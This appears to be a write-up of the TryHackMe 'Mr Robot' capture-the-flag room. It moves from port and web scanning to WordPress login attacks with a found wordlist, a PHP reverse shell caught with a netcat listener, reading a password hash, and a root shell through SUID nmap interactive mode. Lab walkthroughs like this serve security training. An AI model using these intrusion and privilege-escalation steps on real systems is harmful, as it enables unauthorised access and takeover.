> [!info]
> https://tryhackme.com/room/mrrobot
> IP:10.10.143.217

---
# Recon

## Nmap
```bash
nmap -p- 10.10.143.217 -T5 -vv
```
![mrrobot](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/mrrobot/screenshots/20250511212353.png)
## Nmap NSE
```bash
sudo nmap 10.10.143.217 -p22,443,80 -sC -sV -T5 --script=http* 
```
![mrrobot](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/mrrobot/screenshots/20250511215034.png)
## WEB
> [!NOTE]
> Discovered open port 443/tcp on 10.10.143.217
> Discovered open port 80/tcp on 10.10.143.217

```http
http://10.10.143.217:443/
```

![mrrobot](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/mrrobot/screenshots/20250511212905.png)

```http
http://10.10.143.217:80/
```
![mrrobot](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/mrrobot/screenshots/20250511212845.png)
### nikto
```bash
nikto -h 10.10.143.217  
```

### FFUF
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://10.10.143.217/FFUZ -ic -c
```

![mrrobot](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/mrrobot/screenshots/20250511213338.png)

```http
http://10.10.143.217/robots.txt
```

![mrrobot](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/mrrobot/screenshots/20250511213502.png)
### WP admin panel
```http
http://10.10.143.217/wp-login.php
```


```bash
wget http://10.10.143.217/fsocity.dic
```

```
sort fsocity.dic  | uniq > passwd.txt
```

![mrrobot](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/mrrobot/screenshots/20250511214529.png)

---
# RCE
![mrrobot](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/mrrobot/screenshots/20250511214644.png)

```revers shell
https://github.com/pentestmonkey/php-reverse-shell
```

```bash
nc -lnvp PORT
```
# LPE

#### Spawn pty 
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:************************************
```

## SUID NMAP
![mrrobot](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/mrrobot/screenshots/20250511214946.png)

```bash
robot@linux:~$ /usr/local/bin/nmap --interactive
/usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
```
